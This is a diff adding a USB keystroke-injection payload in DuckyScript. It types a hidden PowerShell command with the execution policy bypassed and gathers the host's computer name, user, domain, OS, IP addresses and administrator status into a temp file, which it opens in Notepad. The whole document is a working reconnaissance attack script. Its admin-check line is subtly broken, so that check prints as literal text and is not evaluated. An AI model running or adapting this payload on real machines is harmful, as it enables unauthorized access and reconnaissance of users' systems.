@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+STRING $output = "System Recon Report`n"; $output += "================`n"; $output += "Computer: $env:COMPUTERNAME`n"; $output += "User: $env:USERNAME`n"; $output += "Domain: $env:USERDOMAIN`n"; $output += "OS: $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)`n"; $output += "IP: $(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'} | Select-Object -ExpandProperty IPAddress)`n"; $output += "Admin: $([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)`n"; $output | Out-File -FilePath "$env:TEMP\recon.txt" -Encoding ASCII; notepad "$env:TEMP\recon.txt"
+ENTER
